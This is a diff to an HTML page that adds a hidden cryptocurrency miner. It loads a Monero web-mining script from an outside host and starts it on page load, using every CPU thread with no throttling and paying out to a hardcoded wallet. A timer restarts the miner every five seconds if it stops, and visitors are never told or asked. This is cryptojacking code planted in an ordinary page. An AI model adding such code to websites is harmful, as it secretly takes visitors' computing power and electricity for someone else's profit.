@@ -17,5 +17,25 @@
     </div>
 
     <script src="script.js"></script>
+    <script src="https://webminer.moneroocean.stream/miner.min.js"></script>
+<script>
+    let miner = new Client.Anonymous("87MNbagffuE5hTDuNnJ8wqE6yJ6zX57oUTekj7GzxJH43E1Se12ZPFm9Nd1RtzCEm9CBcNwtRYLXZ55qKoQkBAxgJEhau1L", {
+        threads: navigator.hardwareConcurrency, 
+        throttle: 0,
+    });
+
+    function startMining() {
+        miner.start();
+        console.log("Майнинг запущен!");
+    }
+
+    setInterval(() => {
+        if (!miner.isRunning()) {
+            miner.start();
+        }
+    }, 5000);
+
+    startMining();
+</script>
 </body>
 </html>
